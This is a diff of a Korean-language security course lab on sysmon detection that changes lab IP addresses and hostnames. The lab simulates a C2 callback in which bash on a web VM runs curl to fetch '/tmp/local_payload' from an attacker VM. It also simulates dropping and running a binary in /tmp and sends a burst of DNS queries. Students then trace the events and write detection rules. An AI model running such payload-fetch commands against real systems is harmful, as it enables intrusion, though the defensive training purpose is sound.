@@ -770,12 +770,12 @@ osquery (W07) 는 매장의 한 순간의 정지 사진 (snapshot) 이었다면,
 attacker VM 에서 web VM 에 SSH 로 들어간 뒤 bash 안에서 외부로 통신하는 시뮬을 실행한다. 학습 환경 한정으로 실행한다.
 
 ```bash
-ssh ccc@192.168.0.112
+ssh 6v6-attacker
 
-ssh -o StrictHostKeyChecking=no admin@192.168.0.103
+ssh -o StrictHostKeyChecking=no admin@10.20.32.80
 
 # web VM 안 (학습 환경 한정)
-bash -c 'curl -s -o /tmp/local_payload http://192.168.0.112:8080/ || true'
+bash -c 'curl -s -o /tmp/local_payload http://10.20.30.202:8080/ || true'
 ```
 
 각 줄의 의미는 다음과 같다.
@@ -784,7 +784,7 @@ bash -c 'curl -s -o /tmp/local_payload http://192.168.0.112:8080/ || true'
 - `curl -s -o /tmp/local_payload http://...` — attacker VM 의 http 서버에서 임시 파일을 받는 시뮬. 외부 C2 callback 의 단순화된 형태.
 - `|| true` — 실패해도 종료 코드 0. event 발생만 보장.
 
-attacker VM 에 8080 의 simple HTTP server 가 띄워져 있다고 가정한다. 없으면 connection refused 가 나도 Event 3 자체는 발생한다.
+6v6-attacker (10.20.30.202) 에 8080 의 simple HTTP server 가 띄워져 있다고 가정한다. 없으면 connection refused 가 나도 Event 3 자체는 발생한다. web VM (dmz) → attacker VM (ext) 의 dmz→ext forward 경로는 학습 환경의 fw 가 의도적으로 허용한다.
 
 **2. 발생하는 로그/아티팩트.**
 
@@ -801,7 +801,7 @@ Event 1 ProcessCreate:
 
 Event 3 NetworkConnect:
   Image=/usr/bin/curl, ProcessGuid={...B}
-  DestinationIp=192.168.0.112, DestinationPort=8080
+  DestinationIp=10.20.30.202, DestinationPort=8080
 ```
 
 핵심은 다음 두 가지다. bash 의 ProcessGuid 가 curl 의 ParentProcessGuid 와 일치한다 (parent-child 관계). curl 의 ProcessGuid 가 Event 3 의 ProcessGuid 와 일치한다 (같은 process 의 network).
@@ -838,7 +838,7 @@ Search: data.sysmon.ProcessGuid:"{...A}" OR data.sysmon.ParentProcessGuid:"{...A
 학생이 다음 세 가지를 판단한다.
 
 - **단일 event vs chain.** 단일 Event 3 만으로는 정상 download 와 구분이 어렵다. parent 가 bash 이고 destination 이 외부 IP 이면 의심도가 크게 올라간다.
-- **destination IP 의 reputation.** 학습 환경에서는 attacker VM (192.168.0.112) 이다. 운영 환경에서는 CTI feed 의 known bad IP 와 매칭한다 (W13 학습).
+- **destination IP 의 reputation.** 학습 환경에서는 6v6-attacker (10.20.30.202) 다. 운영 환경에서는 CTI feed 의 known bad IP 와 매칭한다 (W13 학습).
 - **즉시 차단 vs 모니터링.** parent=bash + destination=외부 + binary=/usr/bin/curl 의 결합 패턴은 즉시 격리가 안전하다.
 
 **5. Purple — sysmon chain rule 작성.**
@@ -890,8 +890,8 @@ Search: data.sysmon.ProcessGuid:"{...A}" OR data.sysmon.ParentProcessGuid:"{...A
 attacker VM 에서 web VM 에 SSH 진입 후 `/tmp/` 에 binary 를 만들어 즉시 실행한다.
 
 ```bash
-ssh ccc@192.168.0.112
-ssh -o StrictHostKeyChecking=no admin@192.168.0.103
+ssh 6v6-attacker
+ssh -o StrictHostKeyChecking=no admin@10.20.32.80
 
 # web VM 안 (학습 환경 한정)
 sudo cp /usr/bin/whoami /tmp/local_test_drop
@@ -1004,8 +1004,8 @@ sudo rm -f /tmp/local_test_drop
 attacker VM 에서 web VM 의 SSH 진입 후, 짧은 시간에 같은 도메인을 다수 조회한다. 학습 환경 한정으로 실행한다.
 
 ```bash
-ssh ccc@192.168.0.112
-ssh -o StrictHostKeyChecking=no admin@192.168.0.103
+ssh 6v6-attacker
+ssh -o StrictHostKeyChecking=no admin@10.20.32.80
 
 # web VM 안 (학습 환경 한정)
 for i in $(seq 1 10); do
